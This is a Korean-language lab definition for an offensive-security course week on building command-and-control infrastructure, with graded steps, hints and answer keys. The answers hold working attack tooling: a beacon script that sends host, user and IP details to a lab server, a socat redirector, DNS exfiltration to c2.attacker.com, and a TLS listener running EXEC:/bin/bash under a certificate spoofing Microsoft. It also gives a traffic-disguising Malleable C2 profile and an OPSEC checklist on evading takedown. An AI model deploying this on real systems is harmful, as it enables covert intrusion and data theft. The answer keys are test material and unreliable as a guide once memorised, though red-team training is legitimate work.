lab_id: attack-adv-nonai-week07
title: C2 인프라 구축과 운영
version: non-ai
course: attack-adv-nonai
week: 7
description: Command and Control(C2) 인프라의 설계, 구축, 운영을 실습한다. 다중 리다이렉터, 도메인 프론팅, 암호화 통신 등 탐지 회피를 위한 C2 인프라
  기법을 다룬다.
difficulty: hard
duration_minutes: 120
objectives:
- C2 인프라의 아키텍처와 구성 요소를 이해한다
- 리다이렉터, 도메인 프론팅 등 은닉 기법을 적용한다
- Malleable C2 프로파일의 원리를 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 기본 C2 리스너를 구성하라. netcat을 사용하여 {{ATTACKER_IP}}의 포트 443에서 HTTPS 포트를 흉내내는 리스너를 설정하라(백그라운드).
  hint: nc -lvnp 443으로 리스닝하고 &로 백그라운드 실행한다
  category: exploit
  points: 10
  answer: 'nc -lvnp 4443 &>/tmp/c2_listener.log & echo "C2 Listener PID: $!" && sleep 1 && ss -tlnp |
    grep 4443'
  answer_detail: C2 리스너는 감염된 호스트(비콘)로부터의 콜백을 수신한다. 실전에서는 443(HTTPS)이나 80(HTTP) 포트를 사용하여 정상 트래픽으로 위장한다.
    Cobalt Strike, Sliver, Havoc 등의 C2 프레임워크는 GUI 기반으로 다중 리스너, 세션 관리, 포스트 익스플로잇을 지원한다.
  verify:
    type: output_contains
    expect: C2 Listener
    field: stdout
    semantic:
      intent: 'C2 리스너 — nc -lvnp 4443 & 백그라운드. 비콘 콜백 수신. 실전: 443/80 포트로 정상 트래픽 위장. Cobalt Strike/Sliver/Havoc는
        GUI + 다중 리스너/세션/포스트익스. MITRE T1071.'
      success_criteria:
      - nc -lvnp + 백그라운드 (&)
      - C2 Listener 키워드
      - ss/netstat 포트 검증
      acceptable_methods:
      - nc -lvnp
      - Cobalt Strike Beacon listener
      - Sliver/Havoc/Mythic
      negative_signs:
      - 백그라운드 없음
      - 포트 검증 없음
      - 단순 echo만
  target_vm: attacker
- order: 2
  instruction: C2 비콘을 시뮬레이션하라. curl을 사용하여 5초 간격으로 C2 서버에 체크인하는 비콘 스크립트를 /tmp/beacon.sh에 작성하라.
  hint: while 루프와 sleep으로 주기적 HTTP 요청을 보내는 스크립트를 작성한다
  category: exploit
  points: 10
  answer: "cat > /tmp/beacon.sh << 'SHEOF'\n#!/bin/bash\n# C2 Beacon Simulator - Educational Purpose Only\n\
    C2_SERVER=\"http://10.20.30.201:4443\"\nSLEEP_TIME=5\nJITTER=2\n\nwhile true; do\n    HOSTNAME=$(hostname)\n\
    \    USER=$(whoami)\n    IP=$(hostname -I | awk '{print $1}')\n    CHECKIN=\"beacon=$HOSTNAME&user=$USER&ip=$IP&time=$(date\
    \ +%s)\"\n    curl -s -o /dev/null \"$C2_SERVER/api/checkin?$CHECKIN\" 2>/dev/null\n    ACTUAL_SLEEP=$((SLEEP_TIME\
    \ + RANDOM % JITTER))\n    sleep $ACTUAL_SLEEP\ndone\nSHEOF\nchmod +x /tmp/beacon.sh && cat /tmp/beacon.sh\
    \ && echo '' && echo 'Beacon script created (not executed)'"
  answer_detail: C2 비콘은 주기적으로 C2 서버에 체크인하여 명령을 받아 실행한다. 지터(Jitter)는 체크인 간격에 무작위성을 추가하여 일정 패턴 기반 탐지를 회피한다.
    실제 비콘은 프로세스 인젝션, 메모리 전용 실행, 암호화 통신 등으로 탐지를 어렵게 만든다.
  verify:
    type: output_contains
    expect: Beacon script
    field: stdout
    semantic:
      intent: '비콘 스크립트 — while loop + curl /api/checkin?beacon= + JITTER 무작위 sleep. 지터 = 패턴 탐지 회피. 실전:
        프로세스 인젝션 + 메모리 전용 + 암호화. MITRE T1071.001 Web Protocols + T1029 Scheduled Transfer.'
      success_criteria:
      - Beacon script 키워드
      - while + curl + sleep + JITTER
      - 체크인 데이터 (hostname/user/ip)
      acceptable_methods:
      - bash 비콘
      - Cobalt Strike Beacon
      - Sliver implant
      negative_signs:
      - 지터 없음
      - 체크인 데이터 없음
      - 고정 sleep만
  target_vm: attacker
- order: 3
  instruction: 리다이렉터를 시뮬레이션하라. socat을 사용하여 로컬 포트 8443의 트래픽을 C2 서버({{ATTACKER_IP}}:4443)로 포워딩하는 명령을 작성하라.
  hint: socat TCP-LISTEN:포트,fork TCP:대상:포트 형태로 포워딩한다
  category: exploit
  points: 10
  answer: echo 'socat TCP-LISTEN:8443,reuseaddr,fork TCP:10.20.30.201:4443 &' && echo '' && echo '===
    C2 Redirector Architecture ===' && echo 'Victim -> Redirector (8443) -> C2 Server (4443)' && echo
    '' && echo 'Benefits:' && echo '1. C2 server IP not exposed to victims' && echo '2. Multiple redirectors
    for redundancy' && echo '3. Quick burn and replace if detected' && echo '4. Geographic distribution
    for evasion'
  answer_detail: 리다이렉터는 비콘 트래픽을 실제 C2 서버로 중계하여 C2 서버의 IP를 숨긴다. 리다이렉터가 탐지되어 차단되면 새 리다이렉터로 교체하고 C2 서버는 유지한다.
    Apache mod_rewrite를 사용한 조건부 리다이렉션은 보안 연구원의 직접 접근을 차단하면서 비콘만 통과시킨다.
  verify:
    type: output_contains
    expect: C2 Redirector
    field: stdout
    semantic:
      intent: C2 리다이렉터 — socat TCP-LISTEN:8443,reuseaddr,fork TCP:10.20.30.201:4443. Victim → Redirector(8443)
        → C2(4443). C2 IP 은닉 + 다중 redundancy + 빠른 burn/replace + 지리적 분산. Apache mod_rewrite 조건부 리다이렉션.
        MITRE T1090.
      success_criteria:
      - C2 Redirector 키워드
      - socat TCP-LISTEN + TCP:대상
      - 아키텍처 (Victim → R → C2) 다이어그램
      acceptable_methods:
      - socat 릴레이
      - iptables PREROUTING
      - Apache mod_rewrite 조건부
      negative_signs:
      - 릴레이 명령 없음
      - 아키텍처 없음
      - C2 보호 맥락 없음
  target_vm: attacker
- order: 4
  instruction: 도메인 프론팅(Domain Fronting) 기법의 원리를 분석하고 문서화하라. CDN을 통한 트래픽 은닉 과정을 설명하라.
  hint: SNI와 Host 헤더의 불일치를 활용하는 원리를 설명한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== Domain Fronting ===\n\n[Principle]\nTLS SNI: legitimate-cdn.com (seen by network
    monitor)\nHTTP Host: c2.attacker.com (processed by CDN backend)\n\n[Flow]\n1. Beacon connects to CDN
    IP (e.g., CloudFront)\n2. TLS handshake shows SNI = trusted-domain.com\n3. HTTP Host header = attacker-backend.com\n4.
    CDN routes to attacker backend\n5. Network monitor sees only CDN traffic\n\n[Detection]\n- Compare
    SNI vs Host header (requires TLS inspection)\n- Monitor for unusual CDN usage patterns\n- DNS analytics
    for CDN CNAME chains\n\n[Status]\n- Major CDNs (AWS, Azure, GCP) now block domain fronting\n- Alternative:
    Domain borrowing, CDN tunneling still possible'''
  answer_detail: 도메인 프론팅은 CDN의 라우팅 로직을 악용하여 트래픽의 실제 목적지를 숨긴다. TLS SNI에는 합법적 도메인을, HTTP Host 헤더에는 C2 도메인을
    설정하면 네트워크 모니터에는 CDN 트래픽으로만 보인다. 주요 클라우드 제공업체가 이를 차단하였으나, 유사 변형 기법은 지속적으로 발전하고 있다.
  verify:
    type: output_contains
    expect: Domain Fronting
    field: stdout
    semantic:
      intent: '도메인 프론팅 — TLS SNI(legitimate-cdn.com) ≠ HTTP Host(c2.attacker.com) → CDN 백엔드 라우팅. 네트워크
        모니터는 CDN만 보임. AWS/Azure/GCP 차단(2018-2019). 대안: 도메인 borrowing + CDN 터널링. MITRE T1090.004.'
      success_criteria:
      - Domain Fronting 키워드
      - SNI vs Host 헤더 차이
      - 차단 상태 (AWS/Azure/GCP) 언급
      acceptable_methods:
      - Domain Fronting + CDN
      - Domain Borrowing
      - Cloudflare Workers + Tor V3 Onion
      negative_signs:
      - SNI/Host 차이 없음
      - CDN 라우팅 맥락 없음
      - 차단 상태 누락
  target_vm: attacker
- order: 5
  instruction: Malleable C2 프로파일의 개념을 이해하라. HTTP 요청/응답을 정상 웹 트래픽으로 위장하는 프로파일 예제를 /tmp/c2_profile.txt에
    작성하라.
  hint: Cobalt Strike의 Malleable C2 프로파일 형식을 참고하여 HTTP 변환 규칙을 작성한다
  category: exploit
  points: 10
  answer: "cat > /tmp/c2_profile.txt << 'EOF'\n=== Malleable C2 Profile (Google Safe Browsing Mimicry)\
    \ ===\n\nhttp-get {\n    set uri \"/safebrowsing/rd/CltOb12nLW1IbHehYhg\";\n    client {\n       \
    \ header \"Accept\" \"text/html,*/*\";\n        header \"Accept-Language\" \"en-US\";\n        header\
    \ \"Connection\" \"close\";\n        metadata {\n            base64url;\n            append \".class\"\
    ;\n            parameter \"ct\";\n        }\n    }\n    server {\n        header \"Content-Type\"\
    \ \"application/octet-stream\";\n        header \"Cache-Control\" \"public,max-age=172800\";\n   \
    \     output {\n            prepend \"GIF89a\";\n            base64;\n            print;\n       \
    \ }\n    }\n}\n\nhttp-post {\n    set uri \"/safebrowsing/report\";\n    client {\n        header\
    \ \"Content-Type\" \"application/x-www-form-urlencoded\";\n        output {\n            base64;\n\
    \            parameter \"data\";\n        }\n    }\n}\n\n# Traffic appears as Google Safe Browsing\
    \ API calls\n# Data hidden in parameters and GIF file responses\nEOF\ncat /tmp/c2_profile.txt"
  answer_detail: Malleable C2 프로파일은 C2 트래픽의 네트워크 시그니처를 커스터마이즈한다. HTTP 헤더, URI 패턴, 데이터 인코딩을 정상 서비스(Google
    API, Microsoft Update 등)와 동일하게 설정하면 네트워크 IDS/IPS의 시그니처 탐지를 회피할 수 있다. JA3/JA3S 핑거프린트도 고려해야 한다.
  verify:
    type: output_contains
    expect: Malleable C2 Profile
    field: stdout
    semantic:
      intent: 'Malleable C2 프로파일 — Cobalt Strike http-get/http-post 변환 규칙: URI/헤더/metadata 인코딩(base64url
        + .class 추가). 정상 서비스(Google Safebrowsing/MS Update) 위장. 시그니처 IDS 회피. JA3/JA3S 핑거프린트 고려.'
      success_criteria:
      - Malleable C2 Profile 키워드
      - http-get + http-post 블록
      - header + metadata 변환
      acceptable_methods:
      - CS Malleable C2
      - Sliver HTTP profile
      - Mythic C2 profile
      negative_signs:
      - 변환 규칙 없음
      - 정상 트래픽 위장 맥락 없음
      - 헤더/URI 미설정
  target_vm: attacker
- order: 6
  instruction: DNS 기반 C2 통신을 시뮬레이션하라. nslookup을 사용하여 인코딩된 데이터를 DNS TXT 쿼리로 전송하는 과정을 보여라.
  hint: DNS TXT 레코드 쿼리에 명령 결과를 인코딩하여 포함한다
  category: exploit
  points: 10
  answer: 'CMD_RESULT=$(hostname | base64 | tr -d ''=\n'') && echo "=== DNS C2 Communication ==='' &&
    echo ''Encoded data: $CMD_RESULT" && echo '''' && echo ''Outbound (data exfil via subdomain):'' &&
    echo "nslookup ${CMD_RESULT}.data.c2.attacker.com" && echo '''' && echo ''Inbound (command via TXT
    record):'' && nslookup -type=TXT version.bind 2>&1 | head -5 && echo '''' && echo ''Tools: dnscat2,
    iodine, dns2tcp, DNSTT'''
  answer_detail: DNS C2는 거의 모든 네트워크에서 허용되는 DNS 프로토콜을 악용한다. 명령은 TXT 레코드 응답에, 결과는 서브도메인 쿼리에 인코딩된다. 대역폭은
    제한적이지만 은밀성이 매우 높다. 탐지를 위해서는 DNS 쿼리 길이, 빈도, 엔트로피를 분석해야 한다.
  verify:
    type: output_contains
    expect: DNS C2
    field: stdout
    semantic:
      intent: 'DNS C2 — CMD_RESULT=$(hostname | base64 | tr -d ''=\n'') + nslookup ${CMD}.data.c2.attacker.com.
        TXT 응답에 명령 / 서브도메인 쿼리에 결과. 대역폭 낮지만 은밀성↑. 도구: dnscat2/iodine/dns2tcp/DNSTT. 탐지: 쿼리 길이/빈도/엔트로피.'
      success_criteria:
      - DNS C2 키워드
      - base64 인코딩 + 서브도메인
      - 도구 (dnscat2/iodine 등) 언급
      acceptable_methods:
      - nslookup + 인코딩
      - dnscat2 자동
      - iodine IP-over-DNS
      negative_signs:
      - 인코딩 없음
      - DNS 쿼리 없음
      - 도구 없음
  target_vm: attacker
- order: 7
  instruction: C2 통신의 암호화를 구현하라. openssl을 사용하여 자체 서명 인증서를 생성하고, 암호화된 리스너를 설정하는 과정을 보여라.
  hint: openssl req -x509로 자체 서명 인증서를 생성하고, socat에서 SSL을 사용한다
  category: exploit
  points: 10
  answer: openssl req -x509 -newkey rsa:2048 -keyout /tmp/c2_key.pem -out /tmp/c2_cert.pem -days 365 -nodes
    -subj '/CN=microsoft.com/O=Microsoft Corporation' 2>&1 | tail -3 && echo '' && echo '=== Encrypted
    C2 Listener ===' && echo 'socat OPENSSL-LISTEN:443,cert=/tmp/c2_cert.pem,key=/tmp/c2_key.pem,verify=0,fork
    EXEC:/bin/bash' && echo '' && echo 'Certificate mimics legitimate organization' && echo 'Traffic appears
    as normal HTTPS' && openssl x509 -in /tmp/c2_cert.pem -noout -subject -issuer 2>/dev/null
  answer_detail: C2 통신의 TLS 암호화는 DPI(Deep Packet Inspection)를 방해한다. 자체 서명 인증서의 CN과 O 필드를 합법적 조직으로 설정하면
    인증서 검사에서도 위장이 가능하다. 실전에서는 Let's Encrypt로 유효한 인증서를 발급받아 사용한다. JA3 핑거프린트는 TLS 클라이언트의 고유 패턴으로 탐지에 활용된다.
  verify:
    type: output_contains
    expect: Encrypted C2
    field: stdout
    semantic:
      intent: '암호화 C2 — openssl req -x509 -newkey rsa:2048 -subj ''/CN=microsoft.com/O=Microsoft Corporation''
        + socat OPENSSL-LISTEN:443,cert,key,verify=0,fork. CN/O 합법 조직 위장. 실전: Let''s Encrypt 유효 인증서. JA3
        핑거프린트 = TLS 클라이언트 고유.'
      success_criteria:
      - Encrypted C2 키워드
      - openssl req -x509 인증서
      - OPENSSL-LISTEN socat 또는 TLS
      acceptable_methods:
      - openssl + socat OPENSSL
      - Let's Encrypt 유효 인증서
      - stunnel SSL 래퍼
      negative_signs:
      - 인증서 없음
      - TLS 미적용
      - JA3 맥락 없음
  target_vm: attacker
- order: 8
  instruction: C2 인프라의 OPSEC(Operational Security)을 분석하라. 안전한 C2 운영을 위한 체크리스트를 작성하라.
  hint: 인프라 분리, 로그 관리, 인증서, DNS 등 각 측면의 OPSEC을 고려한다
  category: analysis
  points: 10
  answer: echo -e '=== C2 OPSEC Checklist ===\n\n[Infrastructure]\n- Separate staging/long-haul C2 servers\n-
    Use cloud VPS (different providers)\n- No link between C2 and personal identity\n\n[Network]\n- Domain
    categorization (reputation)\n- Aged domains (registered 6+ months ago)\n- SSL certificates from legitimate
    CAs\n- JA3 fingerprint matching common browsers\n\n[Communication]\n- Sleep time > 60s for long-haul\n-
    Jitter 20-50% for beacon randomization\n- Kill date for expired campaigns\n- Peer-to-peer for internal
    pivoting\n\n[Hosting]\n- Pay with cryptocurrency\n- Use VPN/Tor for management\n- Separate attack
    infrastructure per engagement\n\n[Detection Evasion]\n- Malleable C2 profiles mimicking legitimate
    traffic\n- Rotate domains and IPs regularly\n- Monitor for takedown notifications'
  answer_detail: C2 OPSEC은 공격 인프라의 노출을 방지하는 운영 보안이다. 도메인은 최소 6개월 전에 등록하여 평판을 쌓고, 인프라는 참여(engagement)별로
    분리하며, 관리 접근은 VPN/Tor를 통해 수행한다. 위협 인텔리전스 서비스가 인프라를 탐지할 수 있으므로 주기적 모니터링도 필요하다.
  verify:
    type: output_contains
    expect: OPSEC Checklist
    field: stdout
    semantic:
      intent: C2 OPSEC 체크리스트 — Infrastructure(스테이징/long-haul 분리, VPS) + Network(도메인 평판/aged 6+개월/legitimate
        CA/JA3 매칭) + Communication(60s+ sleep, 20-50% jitter, kill date) + Hosting(crypto/VPN-Tor) + Detection
        Evasion(Malleable + 도메인 회전).
      success_criteria:
      - OPSEC Checklist 키워드
      - Infrastructure + Network + Communication 3카테고리 이상
      - 구체 수치 (sleep/jitter/aged)
      acceptable_methods:
      - OPSEC 체크리스트
      - Mandiant/Trellix 보고서 기반
      - RTC2 SpecterOps 가이드
      negative_signs:
      - 카테고리 1개
      - 수치 없음
      - 체크리스트 형식 없음
